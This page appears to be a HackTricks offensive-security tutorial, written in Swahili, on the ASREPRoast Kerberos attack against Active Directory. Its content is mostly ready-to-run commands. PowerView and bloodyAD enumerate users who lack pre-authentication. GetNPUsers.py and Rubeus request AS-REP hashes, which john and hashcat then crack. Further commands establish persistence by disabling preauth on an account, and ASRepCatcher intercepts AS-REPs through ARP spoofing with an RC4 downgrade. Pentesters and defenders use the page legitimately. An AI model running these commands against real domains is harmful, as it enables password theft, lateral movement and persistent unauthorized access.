# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa inayohitajika ya Kerberos pre-authentication**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitisho kwa mtumiaji kutoka kwa Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliofichwa kwa kutumia ufunguo uliochukuliwa kutoka kwa nenosiri la mtumiaji, ambao washambuliaji wanaweza kujaribu kuuvunja bila mtandao ili kugundua nenosiri la mtumiaji.

Mahitaji makuu ya shambulio hili ni:

- **Ukosefu wa Kerberos pre-authentication**: Watumiaji wa lengo hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
- **Muunganisho na Domain Controller (DC)**: Washambuliaji wanahitaji kupata DC ili kutuma maombi na kupokea ujumbe uliofichwa.
- **Akaunti ya kikoa ya hiari**: Kuwa na akaunti ya kikoa kunawawezesha washambuliaji kutambua kwa ufanisi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wahisi majina ya watumiaji.

#### Kuorodhesha watumiaji walio hatarini (hitaji akreditivu za kikoa)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting na Rubeus itazalisha 4768 yenye aina ya usimbaji 0x17 na aina ya preauth 0.

### Kupasua
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast bila hati

Mshambuliaji anaweza kutumia nafasi ya mtu katikati kukamata pakiti za AS-REP wakati zinapopita kwenye mtandao bila kutegemea kuondolewa kwa awali ya uthibitishaji wa Kerberos. Hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatufanya tuweze kufanya hivyo. Zaidi ya hayo, chombo hiki kinawalazimisha vituo vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
